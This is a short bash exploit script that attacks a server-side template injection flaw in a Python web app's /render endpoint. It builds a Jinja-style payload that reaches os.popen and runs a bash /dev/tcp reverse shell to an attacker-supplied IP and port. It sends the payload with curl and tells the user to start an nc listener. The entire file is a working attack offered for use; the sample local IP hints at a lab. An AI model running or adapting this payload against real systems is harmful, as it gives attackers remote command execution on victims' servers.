#!/bin/bash

# Python SSTI Reverse Shell Exploit
# Usage: ./python-ssti-reverse-shell.sh <target-url> <attacker-ip> <attacker-port>

if [ "$#" -ne 3 ]; then
    echo "Usage: $0 <target-url> <attacker-ip> <attacker-port>"
    echo "Example: $0 http://192.168.49.2:30080 10.0.0.5 4444"
    exit 1
fi

TARGET="$1"
ATTACKER_IP="$2"
ATTACKER_PORT="$3"

echo "Exploiting SSTI vulnerability..."
echo "Target: $TARGET"
echo "Reverse shell to: $ATTACKER_IP:$ATTACKER_PORT"
echo ""
echo "Make sure you have a listener running:"
echo "  nc -lvnp $ATTACKER_PORT"
echo ""

# SSTI payload for reverse shell
PAYLOAD="{{config.__class__.__init__.__globals__['os'].popen('bash -c \"bash -i >& /dev/tcp/$ATTACKER_IP/$ATTACKER_PORT 0>&1\"').read()}}"

# URL encode the payload
ENCODED_PAYLOAD=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$PAYLOAD'''))")

# Send the exploit
echo "Sending exploit..."
curl -G "$TARGET/render" --data-urlencode "template=$PAYLOAD" --data-urlencode "name=hacker"

echo ""
echo "Exploit sent! Check your listener."
